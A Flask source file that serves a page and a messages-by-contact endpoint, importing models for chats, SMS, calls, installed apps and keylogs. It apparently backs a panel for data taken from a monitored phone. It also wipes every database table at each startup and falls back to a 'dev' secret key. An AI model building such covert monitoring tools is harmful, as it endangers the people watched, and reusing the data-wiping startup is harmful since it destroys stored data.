from flask import Flask, render_template, jsonify
from models import db, init_db, test_db_connection, Chat, SMS, Calls, Contacts, InstalledApps, Keylogs
import logging
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'dev')

# Initialize database
try:
    db.init_app(app)
    with app.app_context():
        # Drop all tables and recreate them
        db.drop_all()
        db.create_all()
    logger.info("Database initialized successfully!")
except Exception as e:
    logger.error(f"Error initializing database: {str(e)}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/messages/<contact_name>')
def get_messages(contact_name):
    contact = Contacts.query.filter_by(name=contact_name).first()
    if contact:
        messages = Chat.query.filter_by(contact_id=contact.id).order_by(Chat.timestamp).all()
        return jsonify([{
            'message': msg.message,
            'timestamp': msg.timestamp.isoformat(),
            'contact_id': msg.contact_id
        } for msg in messages])
    return jsonify([])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
